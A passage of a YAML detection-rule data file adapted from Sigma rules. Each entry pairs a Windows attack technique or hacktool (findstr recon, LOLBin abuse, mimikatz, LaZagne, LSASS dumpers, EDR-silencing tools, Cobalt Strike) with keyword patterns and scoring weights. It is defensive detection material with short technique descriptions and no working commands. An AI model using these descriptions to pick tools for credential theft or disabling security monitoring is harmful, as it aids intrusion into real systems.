  description: 'Detects usage of findstr with the "EVERYONE" or "BUILTIN" keywords.

    This was seen being used in combination with "icacls" and other utilities to spot
    misconfigured files or folders permissions.

    '
  conditions:
    summary:
      regex_any:
      - permission
      - misconfiguration
      - reconnaissance
      - findstr
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ccb5742c_c248_4982_8c5c_5571b9275ad3
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the execution of a potential recon command where the results
    are piped to "findstr". This is meant to trigger on inline calls of "cmd.exe"
    via the "/c" or "/k" for example.

    Attackers often time use this technique to extract specific information they require
    in their reconnaissance phase.

    '
  conditions:
    summary:
      regex_any:
      - recon
      - command
      - output
      - piped
      - findstr
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4fe074b4_b833_4081_8f24_7dcfeca72b42
  intent: reconnaissance
  tactic: discovery
  description: 'Detects execution of "findstr" to search for common names of security
    tools. Attackers often pipe the results of recon commands such as "tasklist" or
    "whoami" to "findstr" in order to filter out the results.

    This detection focuses on the keywords that the attacker might use as a filter.

    '
  conditions:
    summary:
      regex_any:
      - security
      - tools
      - keyword
      - lookup
      - findstr
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_37db85d1_b089_490a_a59a_c7b6f984f480
  intent: reconnaissance
  tactic: discovery
  description: Detects usage of "findstr" with the argument "385201". Which could
    indicate potential discovery of an installed Sysinternals Sysmon service using
    the default driver altitude (even if the name is changed).
  conditions:
    summary:
      regex_any:
      - sysmon
      - discovery
      - default
      - driver
      - altitude
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_af491bca_e752_4b44_9c86_df5680533dbc
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects execution of the "finger.exe" utility.

    Finger.EXE or "TCPIP Finger Command" is an old utility that is still present on
    modern Windows installation. It Displays information about users on a specified
    remote computer (typically a UNIX computer) that is running the finger service
    or daemon.

    Due to the old nature of this utility and the rareness of machines having the
    finger service. Any execution of "finger.exe" can be considered "suspicious" and
    worth investigating.

    '
  conditions:
    summary:
      regex_any:
      - finger
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4931188c_178e_4ee7_a348_39e8a7a56821
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect filter driver unloading activity via fltmc.exe
  conditions:
    summary:
      regex_any:
      - filter
      - driver
      - unloaded
      - fltmc
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4d7cda18_1b12_4e52_b45c_d28653210df8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects possible Sysmon filter driver unloaded via fltmc.exe
  conditions:
    summary:
      regex_any:
      - sysmon
      - driver
      - unloaded
      - fltmc
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f53714ec_5077_420e_ad20_907ff9bb2958
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of "forfiles" from a non-default location, in
    order to potentially spawn a custom "cmd.exe" from the current working directory.

    '
  conditions:
    summary:
      regex_any:
      - forfiles
      - child
      - process
      - masquerading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9aa5106d_bce3_4b13_86df_3a20f1d5cf0b
  intent: execution
  tactic: execution
  description: 'Detects the execution of "forfiles" with the "/c" flag.

    While this is an expected behavior of the tool, it can be abused in order to proxy
    execution through it with any binary.

    Can be used to bypass application whitelisting.

    '
  conditions:
    summary:
      regex_any:
      - forfiles
      - command
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9fb6b26e_7f9e_4517_a48b_8cac4a1b6c60
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of format.com with an uncommon filesystem selection
    that could indicate a defense evasion activity in which "format.com" is used to
    load malicious DLL files or other programs.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - filesystem
      - load
      - attempt
      - format
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b96b2031_7c17_4473_afe7_a30ce714db29
  intent: execution
  tactic: execution
  description: 'Detects the execution of FSharp Interpreters "FsiAnyCpu.exe" and "FSi.exe"

    Both can be used for AWL bypass and to execute F# code via scripts or inline.

    '
  conditions:
    summary:
      regex_any:
      - fsharp
      - interpreters
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c0b2768a_dd06_4671_8339_b16ca8d1f27f
  intent: execution
  tactic: execution
  description: 'A symbolic link is a type of file that contains a reference to another
    file.

    This is probably done to make sure that the ransomware is able to follow shortcuts
    on the machine in order to find the original file to encrypt

    '
  conditions:
    summary:
      regex_any:
      - fsutil
      - behavior
      - symlinkevaluation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_add64136_62e5_48ea_807e_88638d02df1e
  intent: impact_operations
  tactic: impact
  description: 'Detects suspicious parameters of fsutil (deleting USN journal, configuring
    it with small size, etc).

    Might be used by ransomwares during the attack (seen by NotPetya and others).

    '
  conditions:
    summary:
      regex_any:
      - fsutil
      - suspicious
      - invocation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_06b401f4_107c_4ff9_947f_9ec1e7649f1e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "ftp.exe" script with the "-s" or "/s" flag and
    any child processes ran by "ftp.exe".
  conditions:
    summary:
      regex_any:
      - potential
      - arbitrary
      - command
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_eee00933_a761_4cd0_be70_c42fe91731e7
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects execution of GfxDownloadWrapper.exe with a URL as an argument
    to download file.
  conditions:
    summary:
      regex_any:
      - arbitrary
      - file
      - download
      - gfxdownloadwrapper
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aef9d1f1_7396_4e92_a927_4567c7a495c1
  intent: unknown
  tactic: reconnaissance
  description: Detects execution of "git" in order to clone a remote repository that
    contain suspicious keywords which might be suspicious
  conditions:
    summary:
      regex_any:
      - suspicious
      - clone
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_84b1ecf9_6eff_4004_bafb_bae5c0e251b2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potentially suspicious child processes of "GoogleUpdate.exe"
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - googleupdate
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_037dcd71_33a8_4392_bb01_293c94663e5a
  intent: execution
  tactic: execution
  description: Detects usage of Gpg4win to decrypt files
  conditions:
    summary:
      regex_any:
      - file
      - decryption
      - using
      - gpg4win
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_550bbb84_ce5d_4e61_84ad_e590f0024dcd
  intent: execution
  tactic: execution
  description: Detects usage of Gpg4win to encrypt files
  conditions:
    summary:
      regex_any:
      - file
      - encryption
      - using
      - gpg4win
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_77df53a5_1d78_4f32_bc5a_0e7465bd8f41
  intent: impact_operations
  tactic: impact
  description: Detects the execution of "gpg.exe" from uncommon location. Often used
    by ransomware and loaders to decrypt/encrypt data.
  conditions:
    summary:
      regex_any:
      - portable
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e1e0b7d7_e10b_4ee4_ac49_a4bda05d320d
  intent: execution
  tactic: execution
  description: Detects usage of Gpg4win to encrypt/decrypt files located in potentially
    suspicious locations.
  conditions:
    summary:
      regex_any:
      - file
      - encryption
      - decryption
      - gpg4win
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e56d3073_83ff_4021_90fe_c658e0709e72
  intent: reconnaissance
  tactic: discovery
  description: Detects cases in which a user uses the built-in Windows utility gpresult
    to display the Resultant Set of Policy (RSoP) information
  conditions:
    summary:
      regex_any:
      - gpresult
      - display
      - group
      - policy
      - information
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d65aee4d_2292_4cea_b832_83accd6cfa43
  intent: execution
  tactic: execution
  description: Detects execution of the Notepad++ updater (gup) to launch other commands
    or executables
  conditions:
    summary:
      regex_any:
      - arbitrary
      - binary
      - execution
      - using
      - utility
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_44143844_0631_49ab_97a0_96387d6b2d7c
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects execution of the Notepad++ updater (gup) from a process other
    than Notepad++ to download files.
  conditions:
    summary:
      regex_any:
      - file
      - download
      - using
      - notepad
      - utility
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0a4f6091_223b_41f6_8743_f322ec84930b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of the Notepad++ updater in a suspicious directory,
    which is often used in DLL side-loading attacks
  conditions:
    summary:
      regex_any:
      - suspicious
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f57c58b3_ee69_4ef5_9041_455bf39aaa89
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the usage of "hh.exe" to execute/download remotely hosted ".chm"
    files.
  conditions:
    summary:
      regex_any:
      - remote
      - file
      - download
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_52cad028_0ff0_4854_8f67_d25dfcbc78b4
  intent: unknown
  tactic: initial_access
  description: Detects a suspicious child process of a Microsoft HTML Help (HH.exe)
  conditions:
    summary:
      regex_any:
      - html
      - help
      - suspicious
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e8a95b5e_c891_46e2_b33a_93937d3abc31
  intent: unknown
  tactic: initial_access
  description: Detects a suspicious execution of a Microsoft HTML Help (HH.exe)
  conditions:
    summary:
      regex_any:
      - suspicious
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd8c163e_a19b_402e_bdd5_419ff5859f12
  intent: credential_harvesting
  tactic: credential_access
  description: Detects command line parameters used by ADCSPwn, a tool to escalate
    privileges in an active directory network by coercing authenticate from machine
    accounts and relaying to the certificate service
  conditions:
    summary:
      regex_any:
      - hacktool
      - adcspwn
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f376c8a7_a2d0_4ddc_aa0c_16c17236d962
  intent: execution
  tactic: execution
  description: Detects command line parameters used by Bloodhound and Sharphound hack
    tools
  conditions:
    summary:
      regex_any:
      - hacktool
      - bloodhound
      - sharphound
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b18c9d4c_fac9_4708_bd06_dd5bfacf200f
  intent: defense_evasion
  tactic: defense_evasion
  description: F-Secure C3 produces DLLs with a default exported StartNodeRelay function.
  conditions:
    summary:
      regex_any:
      - hacktool
      - secure
      - load
      - rundll32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_762f2482_ff21_4970_8939_0aa317a886bb
  intent: credential_harvesting
  tactic: credential_access
  description: Detects Certify a tool for Active Directory certificate abuse based
    on PE metadata characteristics and common command line arguments.
  conditions:
    summary:
      regex_any:
      - hacktool
      - certify
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6938366d_8954_4ddc_baff_c830b3ba8fcd
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects Certipy execution, a tool for Active Directory Certificate
    Services enumeration and abuse based on PE metadata characteristics and common
    command line arguments.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - certipy
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_647c7b9e_d784_4fda_b9a0_45c565a7b729
  intent: execution
  tactic: execution
  description: Detects use of Cobalt Strike commands accidentally entered in the CMD
    shell
  conditions:
    summary:
      regex_any:
      - operator
      - bloopers
      - cobalt
      - strike
      - commands
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4f154fb6_27d1_4813_a759_78b93e0b9c48
  intent: execution
  tactic: execution
  description: Detects Cobalt Strike module/commands accidentally entered in CMD shell
  conditions:
    summary:
      regex_any:
      - operator
      - bloopers
      - cobalt
      - strike
      - modules
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ae9c6a7c_9521_42a6_915e_5aaa8689d529
  intent: defense_evasion
  tactic: defense_evasion
  description: Rundll32 can be use by Cobalt Strike with StartW function to load DLLs
    from the command line.
  conditions:
    summary:
      regex_any:
      - cobaltstrike
      - load
      - rundll32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f35c5d71_b489_4e22_a115_f003df287317
  intent: execution
  tactic: execution
  description: Detects potential process patterns related to Cobalt Strike beacon
    activity
  conditions:
    summary:
      regex_any:
      - potential
      - cobaltstrike
      - process
      - patterns
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e8d34729_86a4_4140_adfd_0a29c2106307
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the use of CoercedPotato, a tool for privilege escalation
  conditions:
    summary:
      regex_any:
      - hacktool
      - coercedpotato
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c260b6db_48ba_4b4a_a76f_2f67644e99d2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious command lines used in Covenant luanchers
  conditions:
    summary:
      regex_any:
      - hacktool
      - covenant
      - powershell
      - launcher
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_42a993dd_bb3e_48c8_b372_4d6684c4106c
  intent: reconnaissance
  tactic: discovery
  description: This rule detect common flag combinations used by CrackMapExec in order
    to detect its use even if the binary has been replaced.
  conditions:
    summary:
      regex_any:
      - hacktool
      - crackmapexec
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_058f4380_962d_40a5_afce_50207d36d7e2
  intent: unknown
  tactic: s0106
  description: Detects various execution patterns of the CrackMapExec pentesting framework
  conditions:
    summary:
      regex_any:
      - hacktool
      - crackmapexec
      - execution
      - patterns
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f26307d8_14cd_47e3_a26b_4b4769f24af6
  intent: credential_harvesting
  tactic: credential_access
  description: Detects suspicious process patterns found in logs when CrackMapExec
    is used
  conditions:
    summary:
      regex_any:
      - hacktool
      - crackmapexec
      - process
      - patterns
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6f8b3439_a203_45dc_a88b_abf57ea15ccf
  intent: defense_evasion
  tactic: defense_evasion
  description: The CrachMapExec pentesting framework implements a PowerShell obfuscation
    with some static strings detected by this rule.
  conditions:
    summary:
      regex_any:
      - hacktool
      - crackmapexec
      - powershell
      - obfuscation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_36d88494_1d43_4dc0_b3fa_35c8fea0ca9d
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the use of CreateMiniDump hack tool used to dump the LSASS
    process memory for credential extraction on the attacker's machine
  conditions:
    summary:
      regex_any:
      - hacktool
      - createminidump
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d78b5d61_187d_44b6_bf02_93486a80de5a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of the Dinject PowerShell cradle based on the specific
    flags
  conditions:
    summary:
      regex_any:
      - hacktool
      - dinjector
      - powershell
      - cradle
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d474c8fe_bb69_4ea0_b7d9_f682b56d52d3
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the execution of the Doppelanger hacktool which is used to
    dump LSASS memory via process cloning while evading common detection methods
  conditions:
    summary:
      regex_any:
      - hacktool
      - doppelanger
      - lsass
      - dumper
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2704ab9e_afe2_4854_a3b1_0c0706d03578
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the use of Dumpert process dumper, which dumps the lsass.exe
    process memory
  conditions:
    summary:
      regex_any:
      - hacktool
      - dumpert
      - process
      - dumper
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_eb2d07d4_49cb_4523_801a_da002df36602
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of EDRSilencer, a tool that leverages Windows
    Filtering Platform (WFP) to block Endpoint Detection and Response (EDR) agents
    from reporting security events to the server based on PE metadata information.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - edrsilencer
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c598cc0c_9e70_4852_b9eb_8921af79f598
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of EDR-Freeze, a tool that exploits the MiniDumpWriteDump
    function and WerFaultSecure.exe to suspend EDR and Antivirus processes on Windows.

    EDR-Freeze leverages a race-condition attack to put security processes into a
    dormant state by suspending WerFaultSecure at the moment it freezes the target
    process.

    This technique does not require kernel-level exploits or BYOVD, but instead abuses
    user-mode functionality to temporarily disable monitoring by EDR or Antimalware
    solutions.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - freeze
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_79f4ede3_402e_41c8_bc3e_ebbf5f162581
  intent: execution
  tactic: execution
  description: Detects suspicious powershell command line parameters used in Empire
  conditions:
    summary:
      regex_any:
      - hacktool
      - empire
      - powershell
      - launch
      - parameters
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3268b746_88d8_4cd3_bffc_30077d02c787
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects some Empire PowerShell UAC bypass methods
  conditions:
    summary:
      regex_any:
      - hacktool
      - empire
      - powershell
      - bypass
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a197e378_d31b_41c0_9635_cfdf1c1bb423
  intent: lateral_movement
  tactic: lateral_movement
  description: Adversaries may use Valid Accounts to log into a computer using the
    Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on
    user.
  conditions:
    summary:
      regex_any:
      - hacktool
      - winrm
      - access
      - evil
      - winrm
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_24e3e58a_646b_4b50_adef_02ef935b9fc8
  intent: unknown
  tactic: resource_development
  description: Detects the execution of different Windows based hacktools via their
    import hash (imphash) even if the files have been renamed
  conditions:
    summary:
      regex_any:
      - hacktool
      - execution
      - imphash
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_37c1333a_a0db_48be_b64b_7393b2386e3b
  intent: unknown
  tactic: resource_development
  description: Detects the execution of different Windows based hacktools via PE metadata
    (company, product, etc.) even if the files have been renamed
  conditions:
    summary:
      regex_any:
      - hacktool
      - execution
      - metadata
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9082ff1f_88ab_4678_a3cc_5bcff99fc74d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution GMER tool based on image and hash fields.
  conditions:
    summary:
      regex_any:
      - hacktool
      - gmer
      - rootkit
      - detector
      - remover
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ca621ba5_54ab_4035_9942_d378e6fcde3c
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the use of HandleKatz, a tool that demonstrates the usage of
    cloned handles to Lsass in order to create an obfuscated memory dump of the same
  conditions:
    summary:
      regex_any:
      - hacktool
      - handlekatz
      - lsass
      - dumper
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_39b31e81_5f5f_4898_9c0e_2160cfc0f9bf
  intent: credential_harvesting
  tactic: credential_access
  description: Execute Hashcat.exe with provided SAM file from registry of Windows
    and Password list to crack against
  conditions:
    summary:
      regex_any:
      - hacktool
      - hashcat
      - password
      - cracker
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_85d23b42_9a9d_4f8f_b3d7_d2733c1d58f5
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects usage of HollowReaper, a process hollowing shellcode launcher
    used for stealth payload execution through process hollowing.

    It replaces the memory of a legitimate process with custom shellcode, allowing
    the attacker to execute payloads under the guise of trusted binaries.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - hollowreaper
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f5e3b62f_e577_4e59_931e_0a15b2b94e1e
  intent: unknown
  tactic: s0040
  description: Detects executable names or flags used by Htran or Htran-like tools
    (e.g. NATBypass)
  conditions:
    summary:
      regex_any:
      - hacktool
      - htran
      - natbypass
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aaafa146_074c_11eb_adc1_0242ac120002
  intent: credential_harvesting
  tactic: credential_access
  description: Detects command line parameters used by Hydra password guessing hack
    tool
  conditions:
    summary:
      regex_any:
      - hacktool
      - hydra
      - password
      - bruteforce
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_10c14723_61c7_4c75_92ca_9af245723ad2
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework
  conditions:
    summary:
      regex_any:
      - hacktool
      - potential
      - impacket
      - lateral
      - movement
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4627c6ae_6899_46e2_aa0c_6ebcb1becd19
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the execution of different compiled Windows binaries of the
    impacket toolset (based on names or part of their names - could lead to false
    positives)
  conditions:
    summary:
      regex_any:
      - hacktool
      - impacket
      - tools
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cf0c254b_22f1_4b2b_8221_e137b3c0af94
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of the Impersonate tool. Which can be used to manipulate
    tokens on a Windows computers remotely (PsExec/WmiExec) or interactively
  conditions:
    summary:
      regex_any:
      - hacktool
      - impersonate
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b99a1518_1ad5_4f65_bc95_1ffff97a8fd0
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the use of Inveigh a cross-platform .NET IPv4/IPv6 machine-in-the-middle
    tool
  conditions:
    summary:
      regex_any:
      - hacktool
      - inveigh
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b222df08_0e07_11eb_adc1_0242ac120002
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of Clip.exe to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - clip
      - launcher
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4bf943c6_5146_4273_98dd_e958fd1e3abf
  intent: execution
  tactic: execution
  description: Detects all variations of obfuscated powershell IEX invocation code
    generated by Invoke-Obfuscation framework from the following code block
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - obfuscated
      - invocation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6c96fc76_0eb1_11eb_adc1_0242ac120002
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of stdin to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - stdin
      - launcher
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_27aec9c9_dbb0_4939_8422_1742242471d0
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of Environment Variables to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - launcher
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7eedcc9d_9fdb_4d94_9c54_474e8affc0c7
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - compress
      - obfuscation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9c14c9fa_1a63_4a64_8e57_d19280559490
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via Stdin in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - stdin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e1561947_b4e3_4a74_9bdd_83baed21bdb5
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use Clip.exe in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - clip
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ac20ae82_8758_4f38_958e_b44a3140ca88
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use MSHTA in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - mshta
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e9f55347_2928_4c06_88e5_1a7f8169942e
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via VAR++ LAUNCHER
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - launcher
      - obfuscation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0a99eb3e_1617_41bd_b095_13dc767f3def
  intent: execution
  tactic: execution
  description: Detects the use of Jlaive to execute assemblies in a copied PowerShell
  conditions:
    summary:
      regex_any:
      - hacktool
      - jlaive
      - memory
      - assembly
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5cddf373_ef00_4112_ad72_960ac29bac34
  intent: execution
  tactic: execution
  description: Detects command line parameters used by Koadic hack tool
  conditions:
    summary:
      regex_any:
      - hacktool
      - koadic
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e96253b8_6b3b_4f90_9e59_3b24b99cf9b4
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the use of KrbRelay, a Kerberos relaying tool
  conditions:
    summary:
      regex_any:
      - hacktool
      - krbrelay
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_12827a56_61a4_476a_a9cb_f3068f191073
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects KrbRelayUp used to perform a universal no-fix local privilege
    escalation in Windows domain environments where LDAP signing is not enforced
  conditions:
    summary:
      regex_any:
      - hacktool
      - krbrelayup
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a7664b14_75fb_4a50_a223_cb9bc0afbacf
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects the use of RemoteKrbRelay, a Kerberos relaying tool via CommandLine
    flags and PE metadata.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - remotekrbrelay
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c2b86e67_b880_4eec_b045_50bc98ef4844
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects the execution of the LaZagne. A utility used to retrieve multiple
    types of passwords stored on a local computer.

    LaZagne has been leveraged multiple times by threat actors in order to dump credentials.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - lazagne
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6bd75993_9888_4f91_9404_e1e4e4e34b77
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the execution of the LocalPotato POC based on basic PE metadata
    information and default CLI examples
  conditions:
    summary:
      regex_any:
      - hacktool
      - localpotato
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_15619216_e993_4721_b590_4c520615a67d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting
    a specific service starting
  conditions:
    summary:
      regex_any:
      - potential
      - meterpreter
      - cobaltstrike
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a642964e_bead_4bed_8910_1bb4d63e3b4d
  intent: credential_harvesting
  tactic: credential_access
  description: Detection well-known mimikatz command line arguments
  conditions:
    summary:
      regex_any:
      - hacktool
      - mimikatz
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
